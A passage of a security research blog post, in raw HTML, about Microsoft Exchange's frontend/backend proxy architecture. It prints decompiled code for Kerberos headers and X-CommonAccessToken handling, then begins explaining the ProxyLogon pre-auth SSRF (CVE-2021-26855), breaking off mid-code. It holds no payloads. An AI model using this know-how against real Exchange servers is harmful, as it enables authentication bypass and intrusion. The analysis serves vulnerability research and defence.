    &lt;span class=&quot;n&quot;&gt;serverRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConnectionGroupName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Unauthenticated&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;serverRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Authorization&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KerberosUtilities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GenerateKerberosAuthHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;serverRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TraceContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kerberosChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\KerberosUtilities.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GenerateKerberosAuthHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;traceContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AuthenticationContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authenticationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kerberosChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;authenticationContext&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AuthenticationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;HTTP/&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;authenticationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;InitializeForOutboundNegotiate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AuthenticationMechanism&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Kerberos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SecurityStatus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;securityStatus&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authenticationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;NegotiateSecurityContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;@string&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Negotiate &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;@string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Therefore, a Client request proxied to the Backend will be added with several HTTP Headers for internal use. The two most essential Headers are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt;, which indicates the mail users‚Äô log in identity, and Kerberos Ticket, which represents legal access from the Frontend.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;frontend-response-section&quot;&gt;Frontend Response Section&lt;/h3&gt;

&lt;p&gt;The last is the section of Response. It receives the response from the Backend and decides which headers or cookies are allowed to be sent back to the Frontend.&lt;/p&gt;

&lt;h2 id=&quot;backend-rehydration-module&quot;&gt;Backend Rehydration Module&lt;/h2&gt;

&lt;p&gt;Now let‚Äôs move on and check  how the Backend processes the request from the Frontend. The Backend first uses the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IsAuthenticated&lt;/code&gt; to check whether the incoming request is authenticated. Then the Backend will verify whether the request is equipped with an extended right called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ms-Exch-EPI-Token-Serialization&lt;/code&gt;. With the default setting, only Exchange Machine Account would have such authorization. This is also why the Kerberos Ticket generated by the Frontend could pass the checkpoint but you can‚Äôt access the Backend directly with a low authorized account.&lt;/p&gt;

&lt;p&gt;After passing the check, Exchange will restore the login identity used in the Frontend, through deserializing the header &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt; back to the original Access Token, and then put it in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;httpContext&lt;/code&gt; object to progress to the business logic in the Backend.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Authentication\BackendRehydrationModule.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnAuthenticateRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EventArgs&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsAuthenticated&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ProcessRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ProcessRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CommonAccessToken&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;TryGetCommonAccessToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;TryGetCommonAccessToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommonAccessToken&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-CommonAccessToken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsNullOrEmpty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsTokenSerializationAllowed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Identity&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WindowsIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;BEValidateCATRightsLatency&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stopwatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ElapsedMilliseconds&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elapsedMilliseconds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommonAccessToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Item-CommonAccessToken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;//...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;IsTokenSerializationAllowed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WindowsIdentity&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;windowsIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;flag2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LocalServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;AllowsTokenSerializationBy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientSecurityContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AllowsTokenSerializationBy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientSecurityContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clientContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LocalServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;HasExtendedRightOnServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
        &lt;span class=&quot;n&quot;&gt;WellKnownGuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TokenSerializationRightGuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// ms-Exch-EPI-Token-Serialization&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;the-attack-surface&quot;&gt;The attack surface&lt;/h1&gt;

&lt;p&gt;After a brief introduction to the architecture of CAS, we now realize that CAS is just a well-written HTTP Proxy (or Client), and we know that implementing Proxy isn‚Äôt easy.  So I was wondering:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Could I use a single HTTP request to access different contexts in Frontend and Backend respectively to cause some confusion?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If we could do that, maaaaaybe I could bypass some Frontend restrictions to access arbitrary Backends and abuse some internal API. Or, we can confuse the context to leverage the inconsistency of the definition of dangerous HTTP headers between the Frontend and Backend to do further interesting attacks.&lt;/p&gt;

&lt;p&gt;With these thoughts in mind, let‚Äôs start hunting!&lt;/p&gt;

&lt;h1 id=&quot;the-proxylogon&quot;&gt;The ProxyLogon&lt;/h1&gt;

&lt;p&gt;The first exploit is the ProxyLogon. As introduced before, this may be the most severe vulnerability in the Exchange history ever. ProxyLogon is chained with 2 bugs:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855&quot;&gt;CVE-2021-26855&lt;/a&gt; - Pre-auth SSRF leads to Authentication Bypass&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065&quot;&gt;CVE-2021-27065&lt;/a&gt; - Post-auth Arbitrary-File-Write leads to RCE&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;cve-2021-26855---pre-auth-ssrf&quot;&gt;CVE-2021-26855 - Pre-auth SSRF&lt;/h2&gt;

&lt;p&gt;There are more than 20 handlers corresponding to different application paths in the Frontend. While reviewing the implementations, we found the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetTargetBackEndServerUrl&lt;/code&gt;, which is responsible for calculating the Backend URL in the static resource handler, assigns the Backend target by cookies directly.&lt;/p&gt;

&lt;p&gt;Now you figure out how simple this vulnerability is after learning the architecture!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\ProxyRequestHandler.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Uri&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetTargetBackEndServerUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;LogElapsedTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;E_TargetBEUrl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Uri&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;UrlAnchorMailbox&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlAnchorMailbox&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AnchoredRoutingTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AnchorMailbox&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UrlAnchorMailbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlAnchorMailbox&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlAnchorMailbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;UriBuilder&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetClientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
